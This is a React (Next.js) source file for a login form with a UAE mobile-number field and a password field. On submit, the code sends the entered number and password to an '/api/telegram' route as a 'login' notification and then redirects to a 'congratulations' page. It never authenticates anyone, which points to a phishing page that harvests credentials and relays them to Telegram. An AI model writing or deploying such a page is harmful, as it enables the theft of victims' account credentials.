'use client'

import { useRouter } from 'next/navigation'
import { useState } from 'react'
import { ChevronDown } from 'lucide-react'

export function LoginForm() {
  const [mobile, setMobile] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [isSending, setIsSending] = useState(false)
  const [submitError, setSubmitError] = useState('')
  const router = useRouter()

  const canSubmit = mobile.trim().length > 0 && password.trim().length > 0

  return (
    <form
      className="flex flex-col"
      onSubmit={async (e) => {
        e.preventDefault()
        if (!canSubmit || isSending) return

        setIsSending(true)
        setSubmitError('')
        try {
          const response = await fetch('/api/telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'login', mobile, password }),
          })

          if (!response.ok) throw new Error('Telegram notification failed')
          router.push('/congratulations')
        } catch {
          setSubmitError('Unable to continue. Please try again.')
        } finally {
          setIsSending(false)
        }
      }}
    >
      {/* Mobile Number */}
      <div className="mb-9">
        <label
          htmlFor="mobile"
          className="mb-2 block text-sm text-muted-foreground"
        >
          Mobile Number
        </label>
        <div className="flex items-center gap-2 border-b border-navy pb-2">
          <button
            type="button"
            className="flex shrink-0 items-center gap-1 text-navy"
          >
            <span className="text-sm font-semibold">AE</span>
            <span className="text-lg font-semibold">+971</span>
            <ChevronDown className="h-4 w-4" aria-hidden="true" />
          </button>
          <input
            id="mobile"
            type="tel"
            inputMode="numeric"
            value={mobile}
            onChange={(e) => setMobile(e.target.value)}
            className="w-full bg-transparent text-lg font-semibold text-navy outline-none"
            aria-label="Mobile Number"
          />
        </div>
      </div>

      {/* Password */}
      <div className="mb-12">
        <div className="mb-2 flex items-center justify-between">
          <label htmlFor="password" className="text-sm text-muted-foreground">
            Password
          </label>
          <button
            type="button"
            onClick={() => setShowPassword((v) => !v)}
            className="text-sm font-semibold text-navy"
          >
            {showPassword ? 'Hide' : 'Show'}
          </button>
        </div>
        <div className="border-b border-border pb-2">
          <input
            id="password"
            type={showPassword ? 'text' : 'password'}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full bg-transparent text-lg font-semibold text-navy outline-none"
          />
        </div>
      </div>

      {/* Log In button */}
      <button
        type="submit"
        disabled={!canSubmit || isSending}
        className="mb-5 w-full rounded-full py-4 text-base font-semibold transition-colors enabled:bg-navy enabled:text-white disabled:cursor-not-allowed disabled:bg-muted disabled:text-muted-foreground"
      >
        {isSending ? 'Sending…' : 'Log In'}
      </button>

      {submitError && (
        <p className="mb-5 text-center text-sm text-red-600" role="alert">
          {submitError}
        </p>
      )}

      {/* Forgot password */}
      <button
        type="button"
        className="mx-auto rounded-full border border-navy/30 px-6 py-3 text-base font-semibold text-navy"
      >
        Forgot password
      </button>
    </form>
  )
}
